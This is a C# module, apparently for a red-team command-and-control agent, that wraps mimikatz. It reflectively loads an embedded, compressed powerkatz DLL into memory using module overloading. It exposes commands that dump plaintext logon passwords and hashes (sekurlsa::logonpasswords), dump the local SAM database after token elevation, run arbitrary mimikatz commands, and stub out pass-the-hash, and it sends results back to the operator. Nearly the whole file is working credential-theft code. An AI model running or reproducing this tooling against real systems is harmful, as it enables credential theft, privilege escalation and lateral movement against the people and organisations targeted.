using AgentCore.Controllers;
using AgentCore.Execution.DynamicInvoke;
using AgentCore.Execution.ManualMap;
using AgentCore.Interfaces;
using AgentCore.Models;

using Common.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Agent
{
    public class Module : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        private delegate string MimikatzType(string command);

        public void Init(AgentController agentController, ConfigController configController)
        {
            Agent = agentController;
            Config = configController;
        }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "mimikatz",
                Description = "A little tool to play with Windows security",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "mimikatz",
                        Description = "Any mimikatz command",
                        HelpText = "mimikatz [command]",
                        CallBack = Command
                    },
                    new AgentCommand
                    {
                        Name = "logonpasswords",
                        Description = "Dump plaintext passwords and hashes",
                        HelpText = "logonpasswords",
                        CallBack = LogonPasswords
                    },
                    new AgentCommand
                    {
                        Name = "pth",
                        Description = "",
                        HelpText = "pth [domain\\user] [ntlm hash]",
                        CallBack = PassTheHash
                    },
                    new AgentCommand
                    {
                        Name = "hashdump",
                        Description = "Dump the local SAM database",
                        HelpText = "hashdump",
                        CallBack = HashDump
                    }
                }
            };
        }

        private void HashDump(byte[] data)
        {
            try
            {
                var result = MimikatzCommand("privilege::debug token::elevate lsadump::sam");
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void PassTheHash(byte[] data)
        {
            try
            {
                var result = MimikatzCommand("");
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void LogonPasswords(byte[] data)
        {
            try
            {
                var result = MimikatzCommand("privilege::debug sekurlsa::logonpasswords");
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void Command(byte[] data)
        {
            try
            {
                var result = MimikatzCommand(Encoding.UTF8.GetString(data));
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private string MimikatzCommand(string command)
        {
            try
            {
                var output = default(string);

                var katz = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.comp");
                var pe = Overload.OverloadModule(katz);

                var thread = new Thread(() =>
                {
                    object[] parameters = { command };
                    output = (string) Generic.CallMappedDLLModuleExport(pe.PEINFO, pe.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
                });

                thread.Start();
                thread.Join();

                return output;
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
    }

    static class Utilities
    {
        public static byte[] GetEmbeddedResourceBytes(string resourceName)
        {
            var manifestResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
            var resourceFullName = manifestResources.FirstOrDefault(N => N.Contains(resourceName));

            if (resourceFullName != null)
            {
                return Decompress(Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceFullName).ReadFully());
            }

            return null;
        }

        private static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static byte[] ReadFully(this Stream input)
        {
            byte[] buffer = new byte[16 * 1024];
            using (MemoryStream ms = new MemoryStream())
            {
                int read;
                while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ms.Write(buffer, 0, read);
                }
                return ms.ToArray();
            }
        }
    }
}